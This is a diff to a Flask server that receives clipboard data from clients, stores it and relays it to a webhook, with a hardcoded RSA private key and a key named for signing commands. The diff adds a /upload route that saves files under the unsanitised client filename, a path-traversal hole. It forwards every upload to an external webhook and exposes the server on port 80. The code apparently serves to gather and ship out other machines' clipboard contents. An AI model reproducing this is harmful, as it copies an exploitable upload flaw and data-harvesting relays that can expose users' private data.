@@ -3,6 +3,9 @@ import random
 import requests
 from flask import Flask, request
 import rsa
+from dotenv import load_dotenv, dotenv_values
+
+load_dotenv()
 
 app = Flask(__name__) #creates an instance of this
 
@@ -12,9 +15,31 @@ private = rsa.PrivateKey(2280190274157526050804676045168412152434330997139281502
 
 public_key_for_commands = rsa.PublicKey(107201864084430543558230145717247400445999797193926385396882006881409911684282790515015283683116391089600936105784404298338294529408213801256597419045800169315007374627752173552165180105318136127400062621009046404765105867305344453059667793879482970705619012938060699202530055582108034356438834659746757773697, 65537)
 
+
+@app.post("/upload")
+def upload():
+    if "file" not in request.files:
+        return "missing file", 400
+
+    f = request.files["file"]
+
+    os.makedirs("uploads", exist_ok=True)
+
+    filename = f.filename
+    save_path = os.path.join("uploads", filename)
+    f.save(save_path)
+
+    with open(save_path, "rb") as fp:
+        requests.post(os.getenv("WEBHOOK_URL"), files={"file": fp}, timeout=5)
+
+    return "ok"
+
+
+
+
 #Sets up the routing so that when someone navigates to the local host with the correct port /output this is triggered
 #Also is specified to take in post requests
-"""
+""" 
 get_output receives the post request from the client and processes the data in that file. It adds the data in that file
 to a file on the server so then the server has a copy of all the clipboard_data
 """
@@ -41,13 +66,6 @@ def get_output():
     #data is written to the clipboard file
     server_clipboard_file.write(s + '\n')
 
-    #from PDM project
-    #values = list()
-    #with open("credentials", "r") as f:
-        #values.append(f.readline().split('=')[1].strip())
-        #values.append(f.readline().split('=')[1].strip())
-    #    values.append(f.readline().split('=')[1].strip())
-
     #TODO: make sure whenever I am running the server script that it has access to the credentials
     #token = values[0]
     #channel_id = values[1]
@@ -57,7 +75,7 @@ def get_output():
     message = s
 
     #put url here
-    message_post(message, url)
+    message_post(message, url = os.getenv("WEBHOOK_URL"))
 
     #post returns something so we return a random int between 1 and 1000
     s = random.randint(1, 1000)
@@ -80,14 +98,12 @@ def show_when_connected():
     #token = values[0]
     #channel_id = values[1]
 
-    #posting_url = SECRET
+    posting_url = os.getenv("WEBHOOK_URL")
+
 
     #values[0]
     message = s
     message_post(message, posting_url)
-
-
-
 
     # post returns something so we return a random int between 1 and 1000
     s = random.randint(1, 1000)
@@ -122,5 +138,6 @@ def message_post(message, url):
 def main():
 
     #ip address goes here
-    app.run("127.0.0.1")
+    app.run(host=os.getenv("SERVER_IP"), port=80)
+
 main()
